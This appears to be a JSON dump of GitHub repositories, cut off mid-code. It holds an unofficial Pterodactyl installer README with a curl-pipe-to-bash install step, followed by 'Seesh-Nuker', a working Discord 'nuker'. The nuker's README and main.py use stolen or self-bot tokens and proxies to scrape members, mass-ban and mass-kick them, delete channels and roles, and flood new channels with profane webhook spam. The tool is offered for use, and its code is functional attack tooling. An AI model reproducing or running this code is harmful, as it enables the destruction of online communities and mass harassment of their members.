3NeEEJgNBoRRSmz0ub%2FfuxEacBg%2FDmYtiCjgo5NG2mBXq%2BH5I1ogMRk9Zbd%2BQU2e1ML6VPLOyf5tvBQ8yT1lG10imxsABm7SLs898GTpyYynEzP60hO3trHDKvMigUwdeaceacqzp7nOI4n0SSIIjl36ao4Z356OV07fSQAk6xJ3XGg%2BLCr1d1OYlVHp4eUHPnerU79ZA%2F1kuv1JQMAg%2BE4O2P23EumF3VkvHprsZKMzKwbRUXFEyTvSIEmTVbrysp%2BWr8wfQHGK6WChVa3bKUmdWou%2BjpArdGkzZ41c1zG%2Fu5uGH4swzd561F%2BuhIT4%2BLnSuPsv9%2BJKIpjNr9dXYOyk7%2FBZrcjIT4eCnoKgedJP4BEqhG77E3NKP31FO7cfQA5K0dSYuLgz2TwCWJSOBzG6crzKK%2BohNfni%2Bx6OMUMMNe%2Fgf7ocbw0v0acKg6J8Ql0q%2BT%2FAXR5PNi5dz9c71upuQqCKFAD%2BYhrZLEAmpodaHO3Qy6TI3NhBpbrshGtOWKOSMYwYGQM8nJzoFJNxP2HjyIQho4PewK6hBktoDcUwtIln4PjOWzflQ%2Be5yl0yCCYgYikTclGlxadio%2BBQCSiW1UXoVGrKYwH4RgMrjU1HAB4vR6LzWYfFUCKxfS8Ftk5qxHoCUQAUkRJaSEokkV6Y%2F%2BJUOC4hn6A39NVXVBYeNP8piH6HeA4fPbpdBQV5KOx0QaL1YppX3Jgk0TwH2Vg6S3u%2BdB91%2B%2FpuNYPYFl5uP5V7ZqvsrX7jxqMXR6ff3gCQSTzFI0a1TX3wIs8ul%2Bq4HuWAAiM39vhOuR1O1fQ2gT%2F26Z8Z5vrl2OHi9OXZn995nLV9aFfS6UC9JeJPfuK0NBohWpCHMSAAsFe74WWP%2BvT25wtP9Bpob6uGqqyDnOtaeumjRu%2ByFu36VntK%2FPA5umTJeUtPWZSU9BCgud661odVp3DZtkc7AnYR33RRC708PrVi1larW7XwZIjLnd7R6SgSqWSNjU1B3F72pz5TZbXmX5vV81Yb7Lg7XT%2FUXriu8XLVqw6c6XqWnBKiiYU%2BMt3wWF7u7i91XlSEITwSAZ%2FCzAAHsJVbwXYFFEAAAAASUVORK5CYII%3D)](https://www.gnu.org/software/bash/)\n\nUnofficial scripts for installing Pterodactyl Panel & Wings. Works with the latest version of Pterodactyl!\n\nRead more about [Pterodactyl](https://pterodactyl.io/) here. This script is not associated with the official Pterodactyl Project.\n\n## Features\n\n- Automatic installation of the Pterodactyl Panel (dependencies, database, cronjob, nginx).\n- Automatic installation of the Pterodactyl Wings (Docker, systemd).\n- Panel: (optional) automatic configuration of Let's Encrypt.\n- Panel: (optional) automatic configuration of firewall.\n\n## Help and support\n\nFor help and support regarding the script itself and **not the official Pterodactyl project**, you can join the [Discord Chat](https://pterodactyl-installer.se/discord).\n\n## Supported installations\n\nList of supported installation setups for panel and Wings (installations supported by this installation script).\n\n### Supported panel operating systems and webservers\n\n| Operating System | Version | nginx support      | PHP Version |\n| ---------------- | ------- | ------------------ | ----------- |\n| Ubuntu           | 14.04   | :red_circle:       |             |\n|                  | 16.04   | :red_circle: \\*    |             |\n|                  | 18.04   | :white_check_mark: | 8.0         |\n|                  | 20.04   | :white_check_mark: | 8.0         |\n| Debian           | 8       | :red_circle: \\*    |             |\n|                  | 9       | :white_check_mark: | 8.0         |\n|                  | 10      | :white_check_mark: | 8.0         |\n|                  | 11      | :white_check_mark: | 8.0         |\n| CentOS           | 6       | :red_circle:       |             |\n|                  | 7       | :white_check_mark: | 8.0         |\n|                  | 8       | :white_check_mark: | 8.0         |\n\n### Supported Wings operating systems\n\n| Operating System | Version | Supported          |\n| ---------------- | ------- | ------------------ |\n| Ubuntu           | 14.04   | :red_circle:       |\n|                  | 16.04   | :red_circle: \\*    |\n|                  | 18.04   | :white_check_mark: |\n|                  | 20.04   | :white_check_mark: |\n| Debian           | 8       | :red_circle:       |\n|                  | 9       | :white_check_mark: |\n|                  | 10      | :white_check_mark: |\n|                  | 11      | :white_check_mark: |\n| CentOS           | 6       | :red_circle:       |\n|                  | 7       | :white_check_mark: |\n|                  | 8       | :white_check_mark: |\n\n_\\* Ubuntu 16 and Debian 8 no longer supported since Pterodactyl does not actively support it._\n\n## Using the installation scripts\n\nTo use the installation scripts, simply run this command as root. The script will ask you whether you would like to install just the panel, just the daemon or both.\n\n```bash\nbash <(curl -s https://pterodactyl-installer.se)\n```\n\n_Note: On some systems, it's required to be already logged in as root before executing the one-line command (where `sudo` is in front of the command does not work)._\n\nHere is a [YouTube video](https://www.youtube.com/watch?v=E8UJhyUFoHM) that illustrates the installation process.\n\n## Firewall setup\n\nThe installation scripts can install and configure a firewall for you. The script will ask whether you want this or not. It is highly recommended to opt-in for the automatic firewall setup.\n\n## Development & Ops\n\n### Testing the script locally\n\nTo test the script, we use [Vagrant](https://www.vagrantup.com). With Vagrant, you can quickly get a fresh machine up and running to test the script.\n\nIf you want to test the script on all supported installations in one go, just run the following.\n\n```bash\nvagrant up\n```\n\nIf you only want to test a specific distribution, you can run the following.\n\n```bash\nvagrant up <name>\n```\n\nReplace name with one of the following (supported installations).\n\n- `ubuntu_focal`\n- `ubuntu_bionic`\n- `debian_bullseye`\n- `debian_buster`\n- `debian_stretch`\n- `centos_8`\n- `centos_7`\n\nThen you can use `vagrant ssh <name of machine>` to SSH into the box. The project directory will be mounted in `/vagrant` so you can quickly modify the script locally and then test the changes by running the script from `/vagrant/install_panel.sh` and `/vagrant/install_wings.sh` respectively.\n\n### Creating a release\n\nThere are a couple of files that each release commit should always change. Firstly, update the `CHANGELOG.md` so that the release date and release tag are both displayed. No changes should be made to the changelog points themselves. Secondly, update `GITHUB_SOURCE` and `SCRIPT_RELEASE` in both `install-panel.sh` and `install-wings.sh`. Thirdly, update `SCRIPT_RELEASE` in `install.sh`. Finally, you can now push a commit with the message `Release vX.Y.Z`. Create a release on GitHub. See [this commit](https://github.com/vilhelmprytz/pterodactyl-installer/commit/90aaae10785f1032fdf90b216a4a8d8ca64e6d44) for reference.\n\nWhen the release is published, push another commit which revers the changes you made to `install-wings.sh` and `install-panel.sh`. See [this commit](https://github.com/vilhelmprytz/pterodactyl-installer/commit/be5f361523d1d546d49eef8b3ce1a9145eded234) for reference.\n\n## Contributors \u2728\n\nCopyright (C) 2018 - 2021, Vilhelm Prytz, <vilhelm@prytznet.se>\n\nCreated and maintained by [Vilhelm Prytz](https://github.com/vilhelmprytz).\n\nThanks to the Discord moderators [sam1370](https://github.com/sam1370), [Linux123123](https://github.com/Linux123123) and [sinjs](https://github.com/sinjs) for helping on the Discord server!\n\nAnd special thanks to [Linux123123](https://github.com/Linux123123) for frequently contributing to the project with bug reports, feature requests, pull requests, and more!\n"
        }
    },
    "seesh-gen": {
        "README.md": {
            "code": "### Currently Not Working\n"
        }
    },
    "Seesh-Nuker": {
        "README.md": {
            "code": "<div align=\"center\">\n<img \nheight=\"100px\" \nwidth=\"100px\"\nsrc=\"https://camo.githubusercontent.com/4b028e8e841f57ee96b472fa88ea7ed66ddd3720/687474703a2f2f692e696d6775722e636f6d2f65597779386c632e706e67\"\n></img>\n<h1>Seesh-Nuker</h1><br>\n</div>\n<b>Credits:</b><br />\n- Remake of Seraph Nuker <br />\n- Don't Forget to leave a star for more<br>\n\n<br />\n<b>Fetures:</b><br />  \n- Autoscrape Everything(members, roles, channels)<br>\n- Added Proxy support<br>\n- Commands - Banall, kickall, prune, masschannels, nuke<br>\n- Prefect Nuke command trash a whole server with single cmd <br>\n- Autocreate config.json<br>\n<br />\n\n## How To use\n```bash\nrun install.bat\npip install -r requirements.txt OR pip3 install -r requirements.txt\npython main.py OR python3 main.py\n```\n\n## Screenshot:  <br>\n<img src=\"https://media.discordapp.net/attachments/998749869848154122/1014912627140468736/unknown.png?width=608&height=319\"></img><br>\n"
        },
        "channels.txt": {
            "code": ""
        },
        "members.txt": {
            "code": ""
        },
        "roles.txt": {
            "code": ""
        },
        "proxies.txt": {
            "code": ""
        },
        "main.py": {
            "code": "import os\nfrom encodings import utf_8\nimport sys\nfrom importlib import reload\nencoding = 'UTF-8',\nreload(sys)\nos.system(\"\")\n\nprint(\"Checking For All Required Files...\")\ntry:\n  import discord, requests, sys, time, random, asyncio, json\n  from pypresence import Presence\n  from threading import Thread\n  from discord.ext import commands\n  from colorama import Fore, Style\n  from concurrent.futures import ThreadPoolExecutor\nexcept:\n  print(\"[!] Missing dependencies, please install all dependencies\")\n  print(\"Use \\x1b[38;5;213mpip install -r requirements.txt\\033[37m to install all dependencies\")\n  print(\"[!] Exiting...\")\n  sys.exit()\ntry:\n  if os == \"Windows\":\n    os.system('cls & title [Seesh Nuker] - Starting & mode 69,20') \nexcept:\n    os.system('clear')\n    os.system('title [Seesh Nuker] - Starting & mode 69,20')\n\ntry:\n    with open('data/config.json') as f:\n        config = json.load(f)\nexcept:\n    with open('data/config.json', 'w') as f:\n        print(\"\\n\\033[91m>\\033[39m Config file not found, creating one\")\n        token = input(\"\\n\\033[91m>\\033[39m Enter your token: \")\n        prefix = input(\"\\n\\033[91m>\\033[39m Enter your prefix: \")\n        nuke_name = input(\"\\n\\033[91m>\\033[39m Enter your nuked by: \")\n        invite_link = input(\"\\n\\033[91m>\\033[39m Enter your Spam Invite Link: \")\n        json.dump({\"Token\": token,\n    \"Prefix\": prefix,\n    \"Channel-Names\": [nuke_name+\" was here\", nuke_name+\" ruined you\"], \n\t\"Server-Names\": [nuke_name+\" destroyed you\"],\n\t\"Role-Names\": [nuke_name+\" was here\", nuke_name+\" ruined you\"],\n\t\"Reason\": [\"beamed by \"+nuke_name, nuke_name+\" fucked me\"],\n\t\"Spam\": True,\n\t\"Webhook-Names\": [nuke_name+\" was here\", \"get beamed by \"+nuke_name],\n    \"name\": nuke_name,\n\t\"Spam-Messages\": \"@everyone \"+nuke_name+\" WIZZED YOU\",\n    \"Spam-Invite\": '@everyone fuck you '+invite_link,\n\t\"Spam-Amount\": 10000}, f, indent=4)\n    input(\"\\n\\033[91m>\\033[39m Press Enter To Proceed\")\n    pass\nproxy = None\nwith open('data/config.json') as f:\n    config = json.load(f)\ntoken = config.get('Token')\n\nprefix = config.get('Prefix')\nproxyask = input(\"\\n\\033[91m>\\033[39m Do you want to use proxy? (1) Yes (2) No: \")\nif proxyask == \"1\":\n    print(\"\\033[91m>\\033[39m Proxy Enabled\")\n    with open ('data/proxies.txt', 'r') as f:\n        proxies = f.read().splitlines()\n        proxy1 = random.choice(proxies)\n        proxy = {'http': proxy1, 'https': proxy1}\n\nchannel_names = config.get('Channel-Names')\nserver_names = config.get('Server-Names')\nrole_names = config.get('Role-Names')\nreason = config.get('Reason')\nname = config.get('name')\nspam = config.get('Spam')\ninvilink = config.get('Spam-Invite')\nwebhook_names = config.get('Webhook-Names')\nspam_messages = config.get('Spam-Messages')\nspam_amount = config.get('Spam-Amount')\nBan_Whitelist = config.get('Ban_Whitelist')\n\ndef check_token(token: str) -> str:\n    if requests.get(\"https://discord.com/api/v10/users/@me\", headers={\"Authorization\": token}).status_code == 200:\n        return \"user\"\n    else:\n        return \"bot\"\n\ntoken_type = check_token(token)\n\nif token_type == \"user\":\n    headers = {'Authorization': f'{token}'}\n    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True)\nelse:\n    headers = {'Authorization': f'Bot {token}'}\n    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=False, intents=discord.Intents().all())\nclient.remove_command(\"help\")\n\nasync def memberids(guildID):\n    try:\n            guild = client.get_guild(guildID)\n    except:\n        print(\"\\033[91m>\\033[39m Invalid Guild ID\")\n        await menu()\n\n    try:\n        os.remove(\"Scraped/members.txt\")\n    except:\n        pass\n    membercount = 0\n    with open('Scraped/members.txt', 'a') as f:\n        for member in guild.members:\n            membercount += 1\n            f.write(str(member.id) + \"\\n\")\n        print(f\"\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Scraped \\x1b[38;5;213m{membercount}\\033[37m Members\")\n\nasync def roleids(guildID):\n    try:\n            guild = client.get_guild(guildID)\n    except:\n        print(\"\\033[91m>\\033[39m Invalid Guild ID\")\n        await menu()\n\n    try:\n        os.remove(\"Scraped/roles.txt\")\n    except:\n        pass\n    rolecount = 0\n    with open('Scraped/roles.txt', 'a') as f:\n        for role in guild.roles:\n            rolecount += 1\n            f.write(str(role.id) + \"\\n\")\n        print(f\"\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Scraped \\x1b[38;5;213m{rolecount}\\033[37m Roles\")  \n\nasync def channelids(guildID):\n    try:\n            guild = client.get_guild(guildID)\n    except:\n        print(\"\\033[91m>\\033[39m Invalid Guild ID\")\n        await menu()\n\n    try:\n        os.remove(\"Scraped/channels.txt\")\n    except:\n        pass\n    channelcount = 0\n    with open('Scraped/channels.txt', 'a') as f:\n        for channel in guild.channels:\n            channelcount += 1\n            f.write(str(channel.id) + \"\\n\")\n        print(f\"\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Scraped \\x1b[38;5;213m{channelcount}\\033[37m Channels\")    \nclass Seesh:\n\n    def Name(guild):\n        try:\n\n            json = {\n                'name': random.choice(server_names),\n            }\n            r = requests.patch(f'https://discord.com/api/v10/guilds/{guild}', headers=headers, json=json)\n            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:\n                print(f\"\\x1b[38;5;213m[\\033[37m+\\x1b[38;5;213m]\\033[37m Renamed Guild To\\x1b[38;5;213m {json['name']}\\x1b[38;5;15\")\n            else:\n                print(f\"\\x1b[38;5;213m[\\033[37m-\\x1b[38;5;213m]\\033[37m Couldn't Rename Guild\\x1b[38;5;213m {json['name']}\\x1b[38;5;15\")\n        except:\n            pass\n\n    def CreateWebhook(channel):\n        try:\n            json = {\n                'name': random.choice(webhook_names),\n            }\n            r = requests.post(f'https://discord.com/api/v10/channels/{channel}/webhooks', headers=headers, json=json, proxies=proxy)\n            web_id = r.json()['id']\n            web_token = r.json()['token']\n            return f'https://discord.com/api/webhooks/{web_id}/{web_token}'\n        except:\n            pass\n\n    def SendWebhook(webhook):\n        try:\n            for i in range(spam_amount):\n                randcolor = random.randint(0, 16777215)\n                data = {\n            'content':\n            invilink,\n            'embeds': [{\n                'title':\n                'fucked by your dad',\n                'tts':\n                'true',\n                'description':\n                '.',\n                'url':\n                \"https://discord.gg/seesh\",\n                'color':\n                randcolor,\n                'fields': [{\n                    'name': spam_messages,\n                    'value': '.'\n                }, {\n                    'name': spam_messages,\n                    'value': '.'\n                }, {\n                    'name': spam_messages,\n                    'value': '.'\n                }, {\n                    'name': spam_messages,\n                    'value': '.'\n                }],\n                'author': {\n                    'name':\n                    'Seesh fucks you',\n                    'url':\n                    'https://media.discordapp.net/attachments/1005729774351691776/1014038921002373150/a_18520f6f7947e5acfdffe8e63b748c2e.gif?width=221&height=221',\n                    'icon_url':\n                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'\n                },\n                'footer': {\n                    'text':\n                     spam_messages,\n                    'icon_url':\n                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'\n                },\n                'image': {\n                    'url':\n                    'https://media.discordapp.net/attachments/1005729774351691776/1014038921002373150/a_18520f6f7947e5acfdffe8e63b748c2e.gif?width=221&height=221'\n                },\n                'thumbnail': {\n                    'url':\n                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'\n                }\n            }, {\n                'url':\n                'https://media.discordapp.net/attachments/1005729774351691776/1014038921002373150/a_18520f6f7947e5acfdffe8e63b748c2e.gif?width=221&height=221',\n                'image': {\n                    'url':\n                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'\n                }\n            }, {\n                'url':\n                'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162',\n                'image': {\n                    'url':\n                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'\n                }\n            }, {\n                'url': 'https://discord.gg/seesh',\n                'image': {\n                    'url':\n                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'\n                }\n            }],\n            'username':\n            'Seesh Ruins You',\n            'avatar_url':\n            'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'\n        }\n                spaming = requests.post(webhook, json=data, proxies=proxy)\n                spammingerror = spaming.text\n                if spaming.status_code == 200 or spaming.status_code == 204:\n                    continue\n                if 'rate limited' in spammingerror.lower():\n                    try:\n                        j = json.loads(spammingerror)\n                        ratelimit = j['retry_after']\n                        timetowait = ratelimit / 1000\n                        time.sleep(timetowait)\n                    except:\n                        delay = random.randint(5, 10)\n                        time.sleep(delay)\n                else:\n                    delay = random.randint(30, 60)\n                    time.sleep(delay)\n        except Exception as e:\n            print(f\"\\x1b[38;5;196m[\\033[37m+\\x1b[38;5;196m]\\033[37m Error: {e}\")\n            pass\n    def Ban(guild, member):\n        try:\n            r = requests.put(f'https://discord.com/api/v10/guilds/{guild}/bans/{member}', headers=headers, proxies=proxy)\n            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:\n                print(f\"\\x1b[38;5;213m[\\033[37m+\\x1b[38;5;213m]\\033[37m Banned \\x1b[38;5;113m{member}\\x1b[38;5;15\")\n            else:\n                print(f\"\\x1b[38;5;213m[\\033[37m-\\x1b[38;5;213m]\\033[37m Couldn't Ban\\x1b {Fore.LIGHTRED_EX} {member.strip()}\\x1b[38;5;15 \")\n        except:\n            pass\n    def Kick(guild, member):\n        try:\n            r = requests.delete(f'https://discord.com/api/v10/guilds/{guild}/members/{member}', headers=headers, proxies=proxy)\n            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:\n                print(f\"\\x1b[38;5;213m[\\033[37m+\\x1b[38;5;213m]\\033[37m Kicked\\x1b[38;5;113m {member.strip()}\\x1b[38;5;15\")\n            else:\n                print(f\"\\x1b[38;5;213m[\\033[37m-\\x1b[38;5;213m]\\033[37m Couldn't Kick\\x1b{Fore.LIGHTRED_EX} {member.strip()}\\x1b[38;5;15\")\n        except:\n            pass\n\n    def DelChannel(guild, channel):\n        try:\n            r = requests.delete(f'https://discord.com/api/v10/channels/{channel}', headers=headers, proxies=proxy)\n            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:\n                print(f\"\\x1b[38;5;213m[\\033[37m+\\x1b[38;5;213m]\\033[37m Deleted Channel\\x1b[38;5;113m {channel.strip()}\\x1b[38;5;15\")\n            else:\n                print(f\"\\x1b[38;5;213m[\\033[37m-\\x1b[38;5;213m]\\033[37m Couldn't Delete Channel\\x1b{Fore.LIGHTRED_EX} {channel.strip()}\\x1b[38;5;15\")\n        except:\n            pass\n\n    def CreateChannel(guild):\n        try:\n            json = {\n                'name': random.choice(channel_names),\n                'type': 0\n            }\n            r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/channels', headers=headers, json=json, proxies=proxy)\n            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:\n                print(f\"\\x1b[38;5;213m[\\033[37m+\\x1b[38;5;213m]\\033[37m Created Channel\\x1b[38;5;113m {json['name']}\\x1b[38;5;15\")\n                if spam == True:\n                    webhook = Seesh.CreateWebhook(r.json()['id'])\n                    Thread(target=Seesh.SendWebhook, args=(webhook,)).start()\n            else:\n                print(f\"\\x1b[38;5;213m[\\033[37m-\\x1b[38;5;213m]\\033[37m Couldn't Create Channel\\x1b{Fore.LIGHTRED_EX} {json['name']}\\x1b[38;5;15\")\n        except:\n            pass\n\n    def DelRole(guild, role):\n        try:\n            r = requests.delete(f'https://discord.com/api/v10/guilds/{guild}/roles/{role}', headers=headers, proxies=proxy)\n            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:\n                print(f\"\\x1b[38;5;213m[\\033[37m+\\x1b[38;5;213m]\\033[37m Deleted Role\\x1b[38;5;113m {role.strip()}\\x1b[38;5;15\")\n            else:\n                print(f\"\\x1b[38;5;213m[\\033[37m-\\x1b[38;5;213m]\\033[37m Couldn't Delete Role\\x1b{Fore.LIGHTRED_EX} {role.strip()}\\x1b[38;5;15\")\n        except:\n            pass\n    def CreateRole(guild):\n\n        try:\n            json = {\n                'hoist': 'true',\n                'name': random.choice(role_names),\n                'mentionable': 'true',\n                'color': random.randint(1000000,9999999),\n                'permissions': random.randint(1,10)\n            }\n            r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/roles', headers=headers, json=json, proxies=proxy)\n            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:\n                print(f\"\\x1b[38;5;213m[\\033[37m+\\x1b[38;5;213m]\\033[37m Created Role\\x1b[38;5;113m {json['name']}\\x1b[38;5;15\")\n            else:\n                print(f\"\\x1b[38;5;213m[\\033[37m-\\x1b[38;5;213m]\\033[37m Couldn't Create Role\\x1b{Fore.LIGHTRED_EX}{json['name']}\\x1b[38;5;15\")\n        except:\n            pass\n\nasync def menu():\n    os.system(f'cls & mode 85,20 & title [Seesh Nuker] - Connected: {client.user}')\n    print(f'''{Fore.LIGHTRED_EX}\n\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2557\n\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\n\u255a\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\u255a\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\n\u2591\u255a\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d\u2591\u2591\u2588\u2588\u2554\u2550\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\n\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\n{Style.BRIGHT}''')\n    print(f'''{Fore.RED} Choose Your Option Below :- {Style.BRIGHT}''')\n    print(f'\\033[37m[\\x1b[38;5;113m1\\033[37m] \\033[37m Ban Members     \\x1b[38;5;213m')\n    print(f'\\033[37m[\\x1b[38;5;113m2\\033[37m] \\033[37m Kick Members    \\x1b[38;5;213m')\n    print(f'\\033[37m[\\x1b[38;5;113m3\\033[37m] \\033[37m Prune Members   \\x1b[38;5;213m')\n    print(f'\\033[37m[\\x1b[38;5;113m4\\033[37m] \\033[37m Delete Channels \\x1b[38;5;213m')\n    print(f'\\033[37m[\\x1b[38;5;113m5\\033[37m] \\033[37m Create Channels \\x1b[38;5;213m')\n    print(f'\\033[37m[\\x1b[38;5;113m6\\033[37m] \\033[37m Nuke     \\x1b[38;5;213m')\n    choice = input(\"\\x1b[38;5;213m> \\033[37mChoice\\x1b[38;5;213m: \\033[37m\")\n    if choice > '6' or choice < '1':\n        print(f\"\\x1b[38;5;213m[\\033[37m-\\x1b[38;5;213m]\\033[37m Invalid Choice\\x1b[38;5;15\")\n        await menu()\n    if choice == \"1\":\n        guildID = int(input(\"\\x1b[38;5;213m> \\033[37mGuild ID\\x1b[38;5;213m: \\033[37m\"))\n        try:\n            guild = client.get_guild(guildID)\n            # await memberids(guildID)\n        except:\n            print(\"\\033[91m>\\033[39m Invalid Guild ID\")\n            await menu()\n\n        print(f'\\n\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Starting Ban Process')\n        mainMembers = []\n        num = 0\n        \n        with open(\"Scraped/members.txt\", \"r\") as f:\n            ids = f.readlines()\n\n            for id in ids:\n                mainMembers.append(id)\n\n        members_1 = []\n        members_2 = []\n        members_3 = []\n        members_4 = []\n        members_5 = []\n        members_6 = []\n        total = len(mainMembers)\n        members_per_arrary = round(total/6)\n        \n        for member in mainMembers:\n            if len(members_1) != members_per_arrary:\n                members_1.append(member)\n            else:\n                if len(members_2) != members_per_arrary:\n                    members_2.append(member)\n                else:\n                    if len(members_3) != members_per_arrary:\n                        members_3.append(member)\n                    else:\n                        if len(members_4) != members_per_arrary:\n                            members_4.append(member)\n                        else:\n                            if len(members_5) != members_per_arrary:\n                                members_5.append(member)\n                            else:\n                                if len(members_6) != members_per_arrary:\n                                    members_6.append(member)\n                                else:\n                                    pass\n        print(f\"\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Total Members: {total}\")\n        while True:\n            #try:\n            Thread(target=Seesh.Ban, args=(guild.id, members_1[num],)).start()\n            Thread(target=Seesh.Ban, args=(guild.id, members_2[num],)).start()\n            Thread(target=Seesh.Ban, args=(guild.id, members_3[num],)).start()\n            Thread(target=Seesh.Ban, args=(guild.id, members_4[num],)).start()\n            Thread(target=Seesh.Ban, args=(guild.id, members_5[num],)).start()\n            Thread(target=Seesh.Ban, args=(guild.id, members_6[num],)).start()\n\n            num += 1\n            #except IndexError:\n                #break\n            #except:\n                #pass\n\n        time.sleep(2)\n        await menu()\n    if choice == \"2\":\n        guildID = int(input(\"\\x1b[38;5;213m> \\033[37mGuild ID\\x1b[38;5;213m: \\033[37m\"))\n        try:\n            guild = client.get_guild(guildID)\n            # await memberids(guildID)\n        except:\n            print(\"\\033[91m>\\033[39m Invalid Guild ID\")\n            await menu()\n\n        print(f'\\n\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Starting Kick Process')\n        \n        mainMembers = []\n        num = 0\n        \n        with open(\"Scraped/members.txt\", \"r\") as f:\n            ids = f.readlines()\n\n            for id in ids:\n                mainMembers.append(id)\n\n        members_1 = []\n        members_2 = []\n        members_3 = []\n        total = len(mainMembers)\n        members_per_arrary = round(total/3)\n        \n        for member in mainMembers:\n            if len(members_1) != members_per_arrary:\n                members_1.append(member)\n            else:\n                if len(members_2) != members_per_arrary:\n                    members_2.append(member)\n                else:\n                    if len(members_3) != members_per_arrary:\n                        members_3.append(member)\n                    else:\n                        pass\n        while True:\n            #try:\n                Thread(target=Seesh.Kick, args=(guild.id, members_1[num],)).start()\n                Thread(target=Seesh.Kick, args=(guild.id, members_2[num],)).start()\n                Thread(target=Seesh.Kick, args=(guild.id, members_3[num],)).start()\n                num += 1\n            #except IndexError:\n               # break\n            #except:\n              #  pass\n\n        time.sleep(2)\n        await menu()\n\n    if choice == \"3\":\n        guildID = int(input(\"\\x1b[38;5;213m> \\033[37mGuild ID\\x1b[38;5;213m: \\033[37m\"))\n        try:\n            guild = client.get_guild(guildID)\n        except:\n            print(\"\\033[91m>\\033[39m Invalid Guild ID\")\n            await menu()\n\n        print(f'\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Starting Prune Process')\n        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles[100])\n        print(f'\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Prune Process Complete')\n        await menu()\n\n    if choice == \"4\":\n        guildID = int(input(\"\\x1b[38;5;213m> \\033[37mGuild ID\\x1b[38;5;213m: \\033[37m\"))\n        try:    \n            guild = client.get_guild(guildID)\n            await channelids(guildID)\n        except:\n            print(\"\\033[91m>\\033[39m Invalid Guild ID\")\n            await menu()\n\n        print(f'\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Deleting Channels..')\n        \n        cnum = 0\n        channels = []\n\n        with open(\"Scraped/channels.txt\", \"r\") as f:\n            cids = f.readlines()\n\n            for id in cids:\n                channels.append(id)\n\n        while True:\n            try:\n                Thread(target=Seesh.DelChannel, args=(guild.id, channels[cnum],)).start()\n                cnum += 1\n            except IndexError:\n                break\n            except:\n                pass\n\n        time.sleep(2)\n        await menu()\n\n\n    if choice == \"5\":\n        guildID = int(input(\"\\x1b[38;5;213m> \\033[37mGuild ID\\x1b[38;5;213m: \\033[37m\"))\n        channel_amount = int(input(\"\\x1b[38;5;213m> \\033[37mAmount\\x1b[38;5;213m: \\033[37m\"))\n        try:    \n            guild = client.get_guild(guildID)\n        except:\n            print(\"\\033[91m>\\033[39m Invalid Guild ID\")\n            await menu()\n\n        print(f'\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Creating Channels..')\n        \n\n        for i in range(channel_amount):\n            Thread(target=Seesh.CreateChannel, args=(guild.id,)).start()\n        \n        time.sleep(2)\n        await menu()\n    if choice == 